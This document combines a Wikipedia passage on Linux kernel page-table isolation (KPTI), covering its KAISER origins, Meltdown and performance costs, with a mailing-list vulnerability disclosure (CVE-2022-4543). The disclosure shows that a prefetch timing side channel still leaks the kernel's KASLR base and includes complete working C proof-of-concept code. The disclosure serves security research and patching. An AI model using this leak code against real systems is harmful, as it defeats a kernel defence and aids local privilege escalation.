The KPTI patches were based on KAISER (short for *Kernel Address Isolation to have Side-channels Efficiently Removed*),[[6]](#cite_note-:1-6) a technique conceived in 2016[[14]](#cite_note-Gruss_20180103-14) and published in June 2017 back when Meltdown was not known yet. KAISER makes it harder to defeat KASLR, a 2014 mitigation for a much less severe issue.

In 2014, the Linux kernel adopted [kernel address space layout randomization](/wiki/Kernel_address_space_layout_randomization "Kernel address space layout randomization") (KASLR),[[15]](#cite_note-15) which makes it more difficult to exploit other kernel vulnerabilities,[[16]](#cite_note-16) which relies on kernel address mappings remaining hidden from user space.[[17]](#cite_note-17) Despite prohibiting access to these kernel mappings, it turns out that there are several [side-channel attacks](/wiki/Side-channel_attack "Side-channel attack") in modern processors that can leak the location of this memory, making it possible to work around KASLR.[[6]](#cite_note-:1-6)[[18]](#cite_note-18)[[19]](#cite_note-19)[[20]](#cite_note-k-20)

KAISER addressed these problems in KASLR by eliminating some sources of address leakage.[[6]](#cite_note-:1-6) Whereas KASLR merely prevents address mappings from leaking, KAISER also prevents the data from leaking, thereby covering the Meltdown case.[[21]](#cite_note-m-21)

KPTI is based on KAISER. Without KPTI enabled, whenever executing user-space code (applications), Linux would also keep its entire kernel memory mapped in [page tables](/wiki/Page_table "Page table"), although protected from access. The advantage is that when the application makes a [system call](/wiki/System_call "System call") into the kernel or an [interrupt](/wiki/Interrupt "Interrupt") is received, kernel page tables are always present, so most [context switching](/wiki/Context_switch "Context switch")-related overheads ([TLB flush](/wiki/TLB_flush "TLB flush"), page-table swapping, etc) can be avoided.[[5]](#cite_note-:0-5)

## Meltdown vulnerability and KPTI

[[edit](/w/index.php?title=Kernel_page-table_isolation&action=edit&section=2 "Edit section: Meltdown vulnerability and KPTI")]

In January 2018, the [Meltdown](/wiki/Meltdown_%28security_vulnerability%29 "Meltdown (security vulnerability)") vulnerability was published, known to affect [Intel's x86 CPUs](/wiki/List_of_Intel_CPUs "List of Intel CPUs") and [ARM Cortex-A75](/wiki/ARM_Cortex-A75 "ARM Cortex-A75").[[22]](#cite_note-:42-22)[[23]](#cite_note-:32-23) It was a far more severe vulnerability than the KASLR bypass that KAISER originally intended to fix: It was found that *contents* of kernel memory could also be leaked, not just the locations of memory mappings, as previously thought.

KPTI (conceptually based on KAISER) prevents Meltdown by preventing most protected locations from being mapped to user space.

[AMD](/wiki/AMD "AMD") x86 processors are not currently known to be affected by Meltdown and don't need KPTI to mitigate them.[[13]](#cite_note-:3-13)[[24]](#cite_note-24) However, AMD processors are still susceptible to KASLR bypass when KPTI is disabled.[[20]](#cite_note-k-20)

## Implementation

[[edit](/w/index.php?title=Kernel_page-table_isolation&action=edit&section=3 "Edit section: Implementation")]

KPTI fixes these leaks by separating user-space and kernel-space page tables entirely. One set of page tables includes both kernel-space and user-space addresses same as before, but it is only used when the system is running in kernel mode. The second set of page tables for use in user mode contains a copy of user-space and a minimal set of kernel-space mappings that provides the information needed to enter or exit system calls, interrupts and exceptions.[[5]](#cite_note-:0-5)

On processors that support the [process-context identifiers](/wiki/Process-context_identifier "Process-context identifier") (PCID), a [translation lookaside buffer](/wiki/Translation_lookaside_buffer "Translation lookaside buffer") (TLB) flush can be avoided,[[5]](#cite_note-:0-5) but even then it comes at a significant performance cost, particularly in [syscall](/wiki/Syscall "Syscall")-heavy and interrupt-heavy workloads.[[25]](#cite_note-25)

The overhead was measured to be 0.28% according to KAISER's original authors;[[6]](#cite_note-:1-6) a Linux developer measured it to be roughly 5% for most workloads and up to 30% in some cases, even with the PCID optimization;[[5]](#cite_note-:0-5) for database engine [PostgreSQL](/wiki/PostgreSQL "PostgreSQL") the impact on read-only tests on an Intel [Skylake](/wiki/Skylake_%28microarchitecture%29 "Skylake (microarchitecture)") processor was 7–17% (or 16–23% without PCID),[[26]](#cite_note-26) while a full benchmark lost 13–19% ([Coffee Lake](/wiki/Coffee_Lake "Coffee Lake") vs. [Broadwell-E](/wiki/Broadwell_%28microarchitecture%29 "Broadwell (microarchitecture)")).[[27]](#cite_note-PhoronixInitialBenchmarks-27) Many benchmarks have been done by [Phoronix](/wiki/Phoronix "Phoronix"),[[28]](#cite_note-28)[[29]](#cite_note-29)[[1]](#cite_note-phoronix-more-x86pti-1) [Redis](/wiki/Redis "Redis") slowed by 6–7%.[[27]](#cite_note-PhoronixInitialBenchmarks-27) Linux kernel compilation slowed down by 5% on [Haswell](/wiki/Haswell_%28microarchitecture%29 "Haswell (microarchitecture)").[[30]](#cite_note-30)

KPTI can partially be disabled with the "nopti" kernel boot option. Also provisions were created to disable KPTI if newer processors fix the information leaks.[[2]](#cite_note-:22-2)

## References

[[edit](/w/index.php?title=Kernel_page-table_isolation&action=edit&section=4 "Edit section: References")]

1. ^ [***a***](#cite_ref-phoronix-more-x86pti_1-0) [***b***](#cite_ref-phoronix-more-x86pti_1-1) Larabel, Michael (2018-01-03). ["Further Analyzing The Intel CPU "x86 PTI Issue" On More Systems"](https://www.phoronix.com/scan.php?page=article&item=linux-more-x86pti). *Phoronix*.
2. ^ [***a***](#cite_ref-:22_2-0) [***b***](#cite_ref-:22_2-1) [Corbet, Jonathan](/wiki/Jonathan_Corbet "Jonathan Corbet") (2017-12-20). ["The current state of kernel page-table isolation"](https://lwn.net/Articles/741878/). *LWN.net*.
3. **[^](#cite_ref-3)** Cimpanu, Catalin (2018-01-03). ["OS Makers Preparing Patches for Secret Intel CPU Security Bug"](https://www.bleepingcomputer.com/news/security/os-makers-preparing-patches-for-secret-intel-cpu-security-bug/). *Bleeping Computer*.
4. **[^](#cite_ref-:4_4-0)** ["Spectre, Meltdown: Critical CPU Security Flaws Explained – ExtremeTech"](https://www.extremetech.com/computing/261439-spectre-meltdown-new-critical-security-flaws-explored-explained). *ExtremeTech*. 2018-01-04. Retrieved 2018-01-05.
5. ^ [***a***](#cite_ref-:0_5-0) [***b***](#cite_ref-:0_5-1) [***c***](#cite_ref-:0_5-2) [***d***](#cite_ref-:0_5-3) [***e***](#cite_ref-:0_5-4) [Corbet, Jonathan](/wiki/Jonathan_Corbet "Jonathan Corbet") (2017-11-15). ["KAISER: hiding the kernel from user space"](https://lwn.net/Articles/738975/). *LWN.net*.
6. ^ [***a***](#cite_ref-:1_6-0) [***b***](#cite_ref-:1_6-1) [***c***](#cite_ref-:1_6-2) [***d***](#cite_ref-:1_6-3) [***e***](#cite_ref-:1_6-4) Gruss, Daniel; Lipp, Moritz; Schwarz, Michael; Fellner, Richard; Maurice, Clémentine; Mangard, Stefan (2017-06-24). [*KASLR is Dead: Long Live KASLR*](https://gruss.cc/files/kaiser.pdf) (PDF). Engineering Secure Software and Systems 2017.
7. **[^](#cite_ref-:2_7-0)** [Corbet, Jonathan](/wiki/Jonathan_Corbet "Jonathan Corbet") (2017-12-20). ["Kernel page-table isolation merged"](https://lwn.net/Articles/742404/). *LWN.net*.
8. **[^](#cite_ref-8)** Kroah-Hartman, Greg (2018-01-02). ["Linux 4.14.11 Changelog"](https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.14.11). *kernel.org*.
9. **[^](#cite_ref-9)** Kroah-Hartman, Greg (2018-01-05). ["Linux 4.9.75 Changelog"](https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.9.75). *kernel.org*.
10. **[^](#cite_ref-10)** Kroah-Hartman, Greg (2018-01-05). ["Linux 4.4.110 Changelog"](https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.4.110).
11. **[^](#cite_ref-11)** @aionescu (2017-11-14). ["Windows 17035 Kernel ASLR/VA Isolation In Practice"](https://x.com/aionescu/status/930412525111296000) ([Tweet](/wiki/Tweet_%28social_media%29 "Tweet (social media)")) – via [Twitter](/wiki/Twitter "Twitter").
12. **[^](#cite_ref-12)** ["Apple has already partially implemented fix in macOS for 'KPTI' Intel CPU security flaw"](http://appleinsider.com/articles/18/01/03/apple-has-already-partially-implemented-fix-in-macos-for-kpti-intel-cpu-security-flaw). *AppleInsider*. 3 January 2018. Retrieved 2018-01-03.
13. ^ [***a***](#cite_ref-:3_13-0) [***b***](#cite_ref-:3_13-1) Coldewey, Devin (2018-01-04). ["Kernel panic! What are Meltdown and Spectre, the bugs affecting nearly every computer and device?"](https://techcrunch.com/2018/01/03/kernel-panic-what-are-meltdown-and-spectre-the-bugs-affecting-nearly-every-computer-and-device/). *TechCrunch*.
14. **[^](#cite_ref-Gruss_20180103_14-0)** Gruss, Daniel (2018-01-03). ["#FunFact: We submitted #KAISER to #bhusa17 and got it rejected"](https://twitter.com/lavados/status/948536300830851072). [Archived](https://web.archive.org/web/20180108013055/https%3A//mobile.twitter.com/lavados/status/948536300830851072) from the original on 2018-01-08. Retrieved 2018-01-08 – via Twitter.
15. **[^](#cite_ref-15)** ["Linux kernel 3.14, Section 1.7. Kernel address space randomization"](http://kernelnewbies.org/Linux_3.14#head-192cae48200fccde67b36c75cdb6c6d8214cccb3). *kernelnewbies.org*. 2014-03-30. Retrieved 2014-04-02.
16. **[^](#cite_ref-16)** Bhattacharjee, Abhishek; Lustig, Daniel (2017-09-29). [*Architectural and Operating System Support for Virtual Memory*](https://books.google.com/books?id=roM4DwAAQBAJ&pg=PA56). Morgan & Claypool Publishers. p. 56. [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-1-62705-933-6](/wiki/Special%3ABookSources/978-1-62705-933-6 "Special:BookSources/978-1-62705-933-6").
17. **[^](#cite_ref-17)** Kerner, Sean Michael (2018-01-03). ["KPTI Intel Chip Flaw Exposes Security Risks"](http://www.eweek.com/security/kpti-intel-chip-flaw-exposes-security-risks). *eWEEK*.
18. **[^](#cite_ref-18)** Jang, Yeongjin; Lee, Sangho; Kim, Taesoo (2016). ["Breaking Kernel Address Space Layout Randomization with Intel TSX"](http://people.oregonstate.edu/~jangye/assets/papers/2016/jang%3Adrk-bh.pdf) (PDF). *Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security*. CCS '16. New York, NY, USA: ACM. pp. 380–392. [doi](/wiki/Doi_%28identifier%29 "Doi (identifier)"):[10.1145/2976749.2978321](https://doi.org/10.1145/2976749.2978321). [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-1-4503-4139-4](/wiki/Special%3ABookSources/978-1-4503-4139-4 "Special:BookSources/978-1-4503-4139-4").
19. **[^](#cite_ref-19)** Gruss, Daniel; Maurice, Clémentine; Fogh, Anders; Lipp, Moritz; Mangard, Stefan (2016). ["Prefetch Side-Channel Attacks"](https://gruss.cc/files/prefetch.pdf) (PDF). *Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security*. CCS '16. New York, NY, USA: ACM. pp. 368–379. [doi](/wiki/Doi_%28identifier%29 "Doi (identifier)"):[10.1145/2976749.2978356](https://doi.org/10.1145/2976749.2978356). [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-1-4503-4139-4](/wiki/Special%3ABookSources/978-1-4503-4139-4 "Special:BookSources/978-1-4503-4139-4"). [S2CID](/wiki/S2CID_%28identifier%29 "S2CID (identifier)") [15973158](https://api.semanticscholar.org/CorpusID%3A15973158).
20. ^ [***a***](#cite_ref-k_20-0) [***b***](#cite_ref-k_20-1) Hund, R.; Willems, C.; Holz, T. (May 2013). ["Practical Timing Side Channel Attacks against Kernel Space ASLR"](https://www.ieee-security.org/TC/SP2013/papers/4977a191.pdf) (PDF). *2013 IEEE Symposium on Security and Privacy*. pp. 191–205. [doi](/wiki/Doi_%28identifier%29 "Doi (identifier)"):[10.1109/sp.2013.23](https://doi.org/10.1109/sp.2013.23). [ISBN](/wiki/ISBN_%28identifier%29 "ISBN (identifier)") [978-0-7695-4977-4](/wiki/Special%3ABookSources/978-0-7695-4977-4 "Special:BookSources/978-0-7695-4977-4"). [S2CID](/wiki/S2CID_%28identifier%29 "S2CID (identifier)") [215754624](https://api.semanticscholar.org/CorpusID%3A215754624).
21. **[^](#cite_ref-m_21-0)** ["Meltdown"](https://meltdownattack.com/meltdown.pdf) (PDF).
22. **[^](#cite_ref-:42_22-0)** ["Spectre, Meltdown: Critical CPU Security Flaws Explained – ExtremeTech"](https://www.extremetech.com/computing/261439-spectre-meltdown-new-critical-security-flaws-explored-explained). *ExtremeTech*. 2018-01-04. Retrieved 2018-01-05.
23. **[^](#cite_ref-:32_23-0)** Coldewey, Devin (2018-01-04). ["Kernel panic! What are Meltdown and Spectre, the bugs affecting nearly every computer and device?"](https://techcrunch.com/2018/01/03/kernel-panic-what-are-meltdown-and-spectre-the-bugs-affecting-nearly-every-computer-and-device/). *TechCrunch*.
24. **[^](#cite_ref-24)** ["An Update on AMD Processor Security"](https://www.amd.com/en/corporate/speculative-execution). [AMD](/wiki/AMD "AMD"). 2018-01-04.
25. **[^](#cite_ref-25)** Leyden, John; Williams, Chris (2018-01-02). ["Kernel-memory-leaking Intel processor design flaw forces Linux, Windows redesign"](https://www.theregister.co.uk/2018/01/02/intel_cpu_design_flaw/). *[The Register](/wiki/The_Register "The Register")*.
26. **[^](#cite_ref-26)** Freund, Andres (2018-01-02). ["heads up: Fix for intel hardware bug will lead to performance regressions"](https://www.postgresql.org/message-id/20180102222354.qikjmf7dvnjgbkxe%40alap3.anarazel.de). *[PostgreSQL](/wiki/PostgreSQL "PostgreSQL") development mailing list (pgsql-hackers)*.
27. ^ [***a***](#cite_ref-PhoronixInitialBenchmarks_27-0) [***b***](#cite_ref-PhoronixInitialBenchmarks_27-1) Larabel, Michael (2018-01-02). ["Initial Benchmarks Of The Performance Impact Resulting From Linux's x86 Security Changes"](https://www.phoronix.com/scan.php?page=article&item=linux-415-x86pti&num=2). *[Phoronix](/wiki/Phoronix "Phoronix")*.
28. **[^](#cite_ref-28)** Larabel, Michael (2018-01-02). ["Linux Gaming Performance Doesn't Appear Affected By The x86 PTI Work"](https://www.phoronix.com/scan.php?page=news_item&px=x86-PTI-Initial-Gaming-Tests). *Phoronix*.
29. **[^](#cite_ref-29)** Larabel, Michael (2018-01-03). ["VM Performance Showing Mixed Impact With Linux 4.15 KPTI Patches – Phoronix"](https://www.phoronix.com/scan.php?page=article&item=linux-kpti-kvm). *Phoronix*.
30. **[^](#cite_ref-30)** Velvindron, Loganaden (2018-01-04). ["Linux KPTI performance hit on real workloads"](https://medium.com/%40loganaden/linux-kpti-performance-hit-on-real-workloads-8da185482df3). *Loganaden Velvindron*. Retrieved 2018-01-05.

## External links

[[edit](/w/index.php?title=Kernel_page-table_isolation&action=edit&section=5 "Edit section: External links")]

* [17. Page Table Isolation (PTI) - The Linux Kernel documentation](https://www.kernel.org/doc/html/v5.15/x86/pti.html)
* [KPTI documentation patch](https://lkml.org/lkml/2017/12/18/1523)

![](https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&type=1x1&usesul3=0)
Retrieved from "<https://en.wikipedia.org/w/index.php?title=Kernel_page-table_isolation&oldid=1240427761>"
[Categories](/wiki/Help%3ACategory "Help:Category"):

* [Linux kernel features](/wiki/Category%3ALinux_kernel_features "Category:Linux kernel features")
* [Virtual memory](/wiki/Category%3AVirtual_memory "Category:Virtual memory")
* [X86 architecture](/wiki/Category%3AX86_architecture "Category:X86 architecture")
* [Transient execution CPU vulnerabilities](/wiki/Category%3ATransient_execution_CPU_vulnerabilities "Category:Transient execution CPU vulnerabilities")

* This page was last edited on 15 August 2024, at 09:13 (UTC).
* Text is available under the [Creative Commons Attribution-ShareAlike 4.0 License](/wiki/Wikipedia%3AText_of_the_Creative_Commons_Attribution-ShareAlike_4.0_International_License "Wikipedia:Text of the Creative Commons Attribution-ShareAlike 4.0 International License");
  additional terms may apply. By using this site, you agree to the [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use "foundation:Special:MyLanguage/Policy:Terms of Use") and [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy "foundation:Special:MyLanguage/Policy:Privacy policy"). Wikipedia® is a registered trademark of the [Wikimedia Foundation, Inc.](https://wikimediafoundation.org/), a non-profit organization.

* [Privacy policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3APrivacy_policy)
* [About Wikipedia](/wiki/Wikipedia%3AAbout)
* [Disclaimers](/wiki/Wikipedia%3AGeneral_disclaimer)
* [Contact Wikipedia](//en.wikipedia.org/wiki/Wikipedia%3AContact_us)
* [Code of Conduct](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AUniversal_Code_of_Conduct)
* [Developers](https://developer.wikimedia.org)
* [Statistics](https://stats.wikimedia.org/#/en.wikipedia.org)
* [Cookie statement](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ACookie_statement)
* [Mobile view](//en.m.wikipedia.org/w/index.php?title=Kernel_page-table_isolation&mobileaction=toggle_view_mobile)

* [![Wikimedia Foundation](/static/images/footer/wikimedia-button.svg)](https://wikimediafoundation.org/)
* [![Powered by MediaWiki](/w/resources/assets/poweredby_mediawiki.svg)](https://www.mediawiki.org/)



=== Content from www.openwall.com_776e694c_20250115_102655.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](../../../2022/12/17/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <vbyEQC3tHcxJUNJZ0GdUvwrfJgqYDt5X9gNkzWNdafe932tTAzVpeRIm_xt8rq3i7W2ZRwif9KVRxRZ0i77SqRAT2okJDB458AEh0ghANqU=@protonmail.com>
Date: Fri, 16 Dec 2022 21:01:12 +0000
From: Will <willsroot@...tonmail.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: CVE-2022-4543: KASLR Leakage Achievable even with KPTI through Prefetch Side-Channel

I've discovered that KPTI has implementation issues, allowing any local attacker to easily, quickly, and reliably leak KASLR base via prefetch side-channels based on TLB timing for Intel systems.

I currently have developed code samples that can reliably leak KASLR base using this technique in under a second under normal system conditions with kPTI, both on host and guest OSes (under KVM), on the following CPUs: Intel i5-8265U (Arch 6.0.12-hardened1-1-hardened), Intel i7-8750H, Intel i7-9750H (Ubuntu 5.15.0-56-generic host, custom 5.18.3 on guest), Intel i7-9700F (6.0.12-1-MANJARO), and Intel Xeon(R) CPU E5-2640 (5.10.0-19-amd64). I do not believe this affects AMD CPUs based on personal preliminary testing.

It is already known that systems without KPTI are vulnerable to prefetch side-channels for KASLR leakage. However, there seemed to be an assumption that KPTI/KAISER will provide enough isolation to prevent CPU side-channel attacks against KASLR.

This turns out to not be the case due to what KPTI leaves in userspace mappings. The code under entry_SYSCALL_64 is still mapped into userspace to handle syscalls, and the virtual address mapping is at a constant offset to kernel base. An attacker can repeatedly make syscalls to force that page into the TLB, and then perform the prefetch side-channel to figure out the address of entry_SYSCALL_64, which will break KASLR. This is because prefetch executes faster when a virtual address is in the TLB and avoids a page table walk, and the entry for that page isn't flushed out upon CR3 write due to it having the global bit.

Based on early discussions with security@...nel.org and linux-distros@...openwall.org, this behavior is unintended and might even be a regression in KPTI's implementation. A fix for this is currently not available.

More information can be found at <https://www.willsroot.io/2022/12/entrybleed.html>. The following is a primitive demonstration code that leaks KASLR base on systems with KPTI with a high degree of reliability, compiled with gcc using -static and -no-pie (entry_SYSCALL_64_offset has to be adjusted based on kernel by setting it to the distance between it and startup_64):

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset 0x400000ull

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define STEP 0x100000ull
#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t leak_syscall_entry(void)
{
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++)
        {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }

    return addr;
}

int main()
{
    printf ("KASLR base %llx\n", leak_syscall_entry() - entry_SYSCALL_64_offset);
}

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


